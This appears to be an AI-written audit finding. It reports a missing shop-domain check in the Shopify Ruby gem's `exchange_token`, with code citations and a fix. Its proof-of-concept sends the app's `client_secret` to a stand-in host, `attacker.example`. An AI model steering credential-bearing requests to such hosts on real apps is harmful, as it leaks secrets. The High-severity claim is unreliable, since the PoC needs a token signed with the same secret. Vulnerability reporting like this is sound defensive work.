I found a concrete binding break in `TokenExchange.exchange_token`.

### Title
Missing shop domain validation in `TokenExchange.exchange_token` allows client_secret exfiltration via crafted JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the destination host for the token-exchange request directly from the unvalidated `dest` claim of the session JWT, and sends the app's `client_secret` to that host. Unlike `migrate_to_expiring_token` and `ClientCredentials.client_credentials` in the same module/gem, which both call `Utils::ShopValidator.sanitize!(shop)` before constructing the request session, `exchange_token` never validates `dest_shop` against `ShopValidator`.

### Finding Description
`JwtPayload#shop` simply strips the `https://` prefix from the raw `dest` claim with no domain allow-list check: `@dest.gsub("https://", "")` [1](#0-0) . The only cryptographic guarantee on the token is that it was signed with `Context.api_secret_key` and that `aud == Context.api_key` [2](#0-1)  — there is no validation that `dest`/`iss` is a trusted `myshopify.com`/`spin.dev`/etc. domain the way `Utils::ShopValidator.sanitize!` enforces elsewhere [3](#0-2) .

In `exchange_token`, `dest_shop` is taken straight from `jwt_payload.shop` and used, unsanitized, to build the `Session` whose `shop` attribute later determines the HTTP request's base host: [4](#0-3) 

Compare this to `migrate_to_expiring_token` in the very same file, which explicitly sanitizes the shop before constructing the session and sending the secret: [5](#0-4) 
and to `ClientCredentials.client_credentials`, which does the same: [6](#0-5) 

`Clients::HttpClient` builds its request URL from `session.shop` (via `base_path`/host resolution), so whatever string is in `dest_shop` becomes the host that receives the POST body containing `client_id` and `client_secret` in plaintext.

The identity binding broken: `host validated (none) != host that receives the app's client_secret (dest_shop, attacker-influenceable string)`. Since a session/ID token's signature is verified only against `aud`/`exp`/`nbf`/`iat`, and the `dest` claim's content is otherwise trusted verbatim as a hostname, any actor who can get a validly-signed token containing an attacker-chosen `dest` value (e.g., a malicious/compromised embedded-app iframe origin issuing a crafted token flow, or any code path that constructs a `JwtPayload`/session token with attacker-influenced `dest`) can redirect the client_secret-bearing POST to a host of their choosing.

### Impact Explanation
If `dest_shop` can be influenced to point to a non-Shopify host, the app's `client_secret` (and `client_id`) are sent verbatim in the POST body to that attacker-controlled host — this is SSRF carrying the app's credentials, matching the High-severity criteria in scope (SSRF with the app's credentials / credential leakage). It is also a violation of the "bytes verified vs. bytes parsed" principle since the JWT signature never actually binds/validates the `dest` field against a domain allow-list, unlike the parallel code paths in the same file.

### Likelihood Explanation
This requires obtaining a validly-signed session/ID token where `dest` is not constrained to a trusted Shopify domain. `JwtPayload` itself performs no domain check on `dest`/`iss` at all (only `aud` is checked). Exploitability ultimately also depends on how the host application obtains and passes `session_token` into `exchange_token` (whether it always originates from Shopify-controlled App Bridge flows or could carry attacker-supplied `dest`), which this gem does not control end-to-end — this is a genuine gap in the library's own validation logic regardless, since it inconsistently omits the `ShopValidator` check that the two sibling methods (`migrate_to_expiring_token`, `client_credentials`) apply.

### Recommendation
Apply `Utils::ShopValidator.sanitize!(dest_shop)` to the value derived from the JWT's `dest` claim in `exchange_token` before constructing `shop_session`/making the request, mirroring `migrate_to_expiring_token` and `ClientCredentials.client_credentials`. Additionally, consider validating `dest`/`iss` domain trust directly inside `JwtPayload` so all consumers benefit.

### Proof of Concept
1. Obtain (or construct in a test harness) a JWT signed with the app's `api_secret_key`, with `aud` set to the app's `api_key` and `dest` set to `"https://attacker.example"`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_token, requested_token_type: ...)`.
3. Observe that `Clients::HttpClient` issues `POST https://attacker.example/admin/oauth/access_token` with a body containing `client_id` and `client_secret` in plaintext — contrast with `client_credentials(shop: "attacker.example")`, which raises `Errors::InvalidShopError` via `ShopValidator.sanitize!` instead of ever making the request. [4](#0-3) [3](#0-2)

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L43-45)
```ruby
        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/utils/shop_validator.rb (L56-64)
```ruby
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```

**File:** lib/shopify_api/auth/token_exchange.rb (L40-65)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-115)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```
